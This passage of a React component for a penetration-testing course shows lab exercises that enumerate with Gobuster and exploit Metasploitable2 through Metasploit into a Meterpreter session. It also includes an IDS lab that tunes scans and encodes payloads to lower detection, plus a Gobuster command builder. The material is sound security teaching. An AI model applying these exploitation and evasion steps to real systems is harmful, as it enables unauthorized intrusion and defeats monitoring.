                    directory return if the server blocks directory listing but the folder is real? Why might that differ from a 404?
                  </p>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-white font-semibold flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs text-purple-400">Lab 2</span>
                    From Enumeration to a Working Exploit
                  </div>
                  <ol className="text-sm text-white/50 list-decimal list-inside space-y-1 mt-2">
                    <li>Using Gobuster, find a service or admin panel on Metasploitable2 that reveals a version number.</li>
                    <li>Search Metasploit for a matching exploit module using <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">search</code>.</li>
                    <li>Before running <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">exploit</code>, run <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">check</code> and explain, in your own words, what it actually verifies versus what it doesn't.</li>
                    <li>Get a Meterpreter session and run <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">sysinfo</code> and <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">getuid</code>.</li>
                  </ol>
                  <p className="text-xs text-white/30 mt-2">
                    <strong className="text-white/70">Check yourself:</strong> if <code className="bg-white/5 px-1 rounded text-emerald-400">check</code> reports the target as "safe," is it guaranteed not vulnerable? Why or why not?
                  </p>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-white font-semibold flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs text-purple-400">Lab 3</span>
                    Get Caught On Purpose
                  </div>
                  <ol className="text-sm text-white/50 list-decimal list-inside space-y-1 mt-2">
                    <li>Install Suricata (or use a pre-built IDS VM) in the same lab network.</li>
                    <li>Run a default, unthrottled Gobuster scan and a default Metasploit exploit against a target while the IDS is capturing traffic.</li>
                    <li>Review the alerts generated. Identify exactly which signature fired and why.</li>
                    <li>Now re-run both, tuned down (fewer threads, encoded payload, slower timing), and see what changes in the alert output.</li>
                  </ol>
                  <p className="text-xs text-white/30 mt-2">
                    <strong className="text-white/70">Check yourself:</strong> which change had a bigger effect on detection —
                    reducing Gobuster's thread count, or changing Metasploit's payload encoding? Why does that make sense given
                    what each tool's signature is actually based on?
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                <h3 className="text-white font-semibold flex items-center gap-2">
                  <CheckCircle size={16} className="text-purple-400" /> Quick Self-Quiz (No Looking Up Answers)
                </h3>
                <ol className="text-sm text-white/50 space-y-2 list-decimal list-inside pl-1 mt-2">
                  <li>What flag does gobuster's <code className="bg-white/5 px-1 rounded text-emerald-400">dns</code> mode require instead of <code className="bg-white/5 px-1 rounded text-emerald-400">-u</code>, and why does that mode need it?</li>
                  <li>Why does <code className="bg-white/5 px-1 rounded text-emerald-400">check</code> in Metasploit sometimes say "unknown" rather than vulnerable/not vulnerable?</li>
                  <li>Name two things that make a default Meterpreter payload easy for an EDR to catch.</li>
                  <li>If a directory scan against a target returns 200 OK for every single path you try, what does that most likely mean, and what should you do next?</li>
                </ol>
              </div>
            </div>
          )}

          {/* ─── COMMAND BUILDER ─── */}
          {activeTab === 'builder' && (
            <div>
              <h2 className="text-white font-semibold text-lg text-purple-400 mb-6">Interactive Gobuster Command Builder</h2>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Controls */}
                <div className="space-y-4">
                  <div>
                    <label className="text-sm text-white/40 block mb-1.5">Mode</label>
                    <select
                      value={gobusterMode}
                      onChange={e => setGobusterMode(e.target.value as any)}
                      className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 focus:outline-none focus:ring-2 focus:ring-purple-500"
                    >
                      <option value="dir" style={{ background: '#0d1022' }}>dir (Directories &amp; Files)</option>
                      <option value="dns" style={{ background: '#0d1022' }}>dns (Subdomains)</option>
                      <option value="vhost" style={{ background: '#0d1022' }}>vhost (Virtual Hosts)</option>
                      <option value="fuzz" style={{ background: '#0d1022' }}>fuzz (Parameter Fuzzing)</option>
                    </select>
                  </div>

                  <div>
                    <label className="text-sm text-white/40 block mb-1.5">
                      {gobusterMode === 'dns' ? 'Target Domain (-d)' : 'Target URL (-u)'}
                    </label>
                    <input
                      type="text"
                      value={gobusterUrl}
                      onChange={e => setGobusterUrl(e.target.value)}
                      placeholder={gobusterMode === 'dns' ? 'target.com' : gobusterMode === 'fuzz' ? 'http://target.com/FUZZ' : 'http://target.com'}
                      className={`w-full bg-black/30 border rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 placeholder-white/30 focus:outline-none focus:ring-2 focus:ring-purple-500 ${
                        targetValidation.valid ? 'border-white/10' : 'border-red-500/50'
                      }`}
                    />
                    {!targetValidation.valid && (
                      <p className="text-xs text-red-400 mt-1">{targetValidation.message}</p>
                    )}
                    {gobusterMode === 'fuzz' && (
                      <p className="text-xs text-white/30 mt-1">Include the literal <code className="bg-white/5 px-1 rounded text-emerald-400">FUZZ</code> keyword where the wordlist entries should be substituted.</p>
                    )}
                    {gobusterMode === 'dns' && (
                      <p className="text-xs text-white/30 mt-1">DNS mode uses <code className="bg-white/5 px-1 rounded text-emerald-400">-d</code> for the domain, not <code className="bg-white/5 px-1 rounded text-emerald-400">-u</code>.</p>
                    )}
                  </div>

                  <div>
                    <label className="text-sm text-white/40 block mb-1.5">Wordlist Path</label>
                    <input
                      type="text"
                      value={gobusterWordlist}
                      onChange={e => setGobusterWordlist(e.target.value)}
                      className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 placeholder-white/30 focus:outline-none focus:ring-2 focus:ring-purple-500"
                    />
                    <p className="text-[11px] text-white/20 mt-1">
                      Default is the Kali path. macOS, Debian/Ubuntu without the <code className="bg-white/5 px-1 rounded">dirb</code> package,
                      and Parrot default installations need this changed to wherever your wordlists live.
                      SecLists is usually at <code className="bg-white/5 px-1 rounded">~/SecLists/Discovery/Web-Content/common.txt</code>
                      or <code className="bg-white/5 px-1 rounded">/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</code>.
                    </p>
                  </div>

                  <div>
                    <label className="text-sm text-white/40 block mb-1.5">
                      Threads (-t)
                      {gobusterMode === 'dns' && (
                        <span className="text-white/20 ml-1 text-xs">(not used in DNS mode)</span>
                      )}
                    </label>
                    <input
                      type="number"
                      min="1"
                      max="100"
                      value={gobusterThreads}
                      onChange={e => setGobusterThreads(Math.max(1, parseInt(e.target.value) || 1))}
                      className={`w-full bg-black/30 border rounded-xl px-4 py-2.5 text-sm text-white/80 focus:outline-none focus:ring-2 focus:ring-purple-500 ${
                        gobusterMode === 'dns' ? 'border-white/10 opacity-60' : 'border-white/10'
                      }`}
                      disabled={gobusterMode === 'dns'}
                    />
                    {gobusterMode === 'dns' && (
                      <p className="text-xs text-white/20 mt-1">DNS mode uses <code className="bg-white/5 px-1 rounded">--resolver-threads</code> instead of <code className="bg-white/5 px-1 rounded">-t</code>.</p>
                    )}
                  </div>

                  {gobusterMode === 'dir' && (
                    <div>
                      <label className="text-sm text-white/40 block mb-1.5">Extensions (comma separated)</label>
                      <input
                        type="text"
                        value={gobusterExtensions}
                        onChange={e => setGobusterExtensions(e.target.value)}
                        placeholder="php,html,txt,js,asp,aspx"
                        className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 placeholder-white/30 focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                      <p className="text-xs text-white/20 mt-1">Spaces and empty entries are automatically stripped.</p>
                    </div>
                  )}

                  {gobusterMode !== 'dns' && (
                    <div>
                      <label className="text-sm text-white/40 block mb-1.5">Status codes (-s)</label>
                      <input
                        type="text"
                        value={gobusterStatusCodes}
                        onChange={e => setGobusterStatusCodes(e.target.value)}
                        placeholder="200,204,301,302,307,401,403"
                        className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                    </div>
                  )}

                  <div>
                    <label className="text-sm text-white/40 block mb-1.5">Exclude length (--exclude-length)</label>
                    <input
                      type="text"
                      value={gobusterExcludeLen}
                      onChange={e => setGobusterExcludeLen(e.target.value)}
                      placeholder="e.g. 1234 (wildcard filter noise)"
                      className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:ring-2 focus:ring-purple-500"
                    />
                  </div>

                  <div>
                    <label className="text-sm text-white/40 block mb-1.5">Output file (-o)</label>
                    <input
                      type="text"
                      value={gobusterOutput}
                      onChange={e => setGobusterOutput(e.target.value)}
                      placeholder="gobuster_results.txt"
                      className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:ring-2 focus:ring-purple-500"
                    />
                  </div>

                  <div className="flex flex-wrap gap-4">
                    {gobusterMode !== 'dns' && (
                      <label className="flex items-center gap-2 text-xs text-white/50 cursor-pointer">
                        <input type="checkbox" checked={gobusterFollowRedirect} onChange={e => setGobusterFollowRedirect(e.target.checked)} className="rounded" />
                        Follow redirects (-r)
                      </label>
                    )}
                    <label className="flex items-center gap-2 text-xs text-white/50 cursor-pointer">
                      <input type="checkbox" checked={gobusterNoStatus} onChange={e => setGobusterNoStatus(e.target.checked)} className="rounded" />
                      Hide status (-n)
                    </label>
                  </div>
                </div>

                {/* Output */}
                <div>
                  <label className="text-sm text-white/40 block mb-2">Generated Command</label>
                  <div className="bg-black/60 border border-white/10 rounded-xl p-4 font-mono text-sm min-h-[120px] flex items-center break-all">
                    <span className="text-emerald-400">{generateGobusterCommand()}</span>
                  </div>
                  <div className="flex gap-2 mt-3">
                    <button
                      onClick={() => copyToClipboard(generateGobusterCommand(), 'builder-command')}
                      className="flex-1 py-2.5 rounded-xl bg-purple-500/20 border border-purple-500/30 text-purple-400 hover:bg-purple-500/30 transition-colors text-sm flex items-center justify-center gap-2"
                      aria-label={copiedId === 'builder-command' ? 'Copied to clipboard' : 'Copy to clipboard'}
                    >
                      <Copy size={16} />
                      {copiedId === 'builder-command' ? 'Copied!' : 'Copy Command'}
                    </button>
                  </div>
                  <div className="mt-4 p-3 rounded-xl border border-purple-500/20 flex gap-2" style={{ background: 'rgba(139,92,246,0.06)' }}>
                    <Lightbulb size={14} className="text-purple-400 flex-shrink-0 mt-0.5" />
                    <span className="text-xs text-white/40">Tip: Use <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">-o</code> to save results to a file.</span>
                  </div>
                  {!targetValidation.valid && (
                    <div className="mt-3 p-3 rounded-xl border border-red-500/30 flex items-start gap-2" style={{ background: 'rgba(239,68,68,0.06)' }}>
                      <AlertTriangle size={14} className="text-red-400 flex-shrink-0 mt-0.5" />
                      <span className="text-xs text-red-400">{targetValidation.message}</span>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'checklist' && (
            <div className="space-y-4">
              <div className="flex items-center justify-between flex-wrap gap-2">
                <h2 className="text-white font-semibold text-lg text-purple-400 flex items-center gap-2">
                  <ListChecks size={18} /> Lab Checklist
                </h2>
                <span className="text-sm text-white/40">{checklistDone}/{checklistItems.length} complete</span>
              </div>
              <p className="text-sm text-white/50">Hands-on progress for authorized labs only. Saved in this browser.</p>
              <div className="h-2 rounded-full bg-white/10 overflow-hidden">
                <div className="h-full bg-purple-500 transition-all" style={{ width: `${(checklistDone / Math.max(1, checklistItems.length)) * 100}%` }} />
              </div>
              <div className="space-y-2">
                {checklistItems.map(item => {
                  const on = !!checklist[item.id]
                  return (
                    <button
                      key={item.id}
                      type="button"
                      onClick={() => setChecklist(prev => ({ ...prev, [item.id]: !prev[item.id] }))}
                      className={`w-full text-left p-4 rounded-xl border transition-colors flex gap-3 ${
                        on ? 'border-emerald-500/30 bg-emerald-500/5' : 'border-white/10 bg-white/5 hover:border-white/20'
                      }`}
                    >
                      <span className="mt-0.5 flex-shrink-0">
                        {on ? <CheckCircle size={18} className="text-emerald-400" /> : <div className="w-[18px] h-[18px] rounded-full border border-white/30" />}
                      </span>
                      <span>
                        <span className={`text-sm font-medium ${on ? 'text-emerald-200/90 line-through' : 'text-white'}`}>{item.label}</span>
                        <span className="block text-xs text-white/40 mt-0.5">{item.detail}</span>
                      </span>
                    </button>
                  )
                })}
              </div>
              {checklistDone === checklistItems.length && (
                <div className="text-sm text-emerald-300/90 p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/20">
                  Checklist complete — re-run on a fresh lab box so the flow stays mechanical.
                </div>
              )}
              <button type="button" onClick={() => setChecklist({})} className="text-xs text-white/40 hover:text-white/70 flex items-center gap-1.5">
                <RotateCcw size={12} /> Reset checklist
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}